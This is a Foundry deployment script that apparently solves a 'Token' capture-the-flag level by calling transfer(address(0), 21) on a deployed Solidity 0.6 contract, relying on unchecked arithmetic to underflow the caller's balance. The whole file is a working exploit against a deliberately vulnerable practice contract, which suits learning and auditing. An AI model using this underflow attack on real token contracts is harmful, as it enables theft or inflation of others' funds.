// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Script, console} from "forge-std/Script.sol";
import {Token} from "../src/Level05.sol";

contract TokenScript is Script {
    Token public tokenInstance;

    function setUp() public {
        tokenInstance = Token(0x0D003ae2F30eaAEc38A42e7F6Af588bf49561aa4);
    }

    function run() public {
        vm.startBroadcast();

        tokenInstance.transfer(address(0), 21);

        vm.stopBroadcast();
    }
}
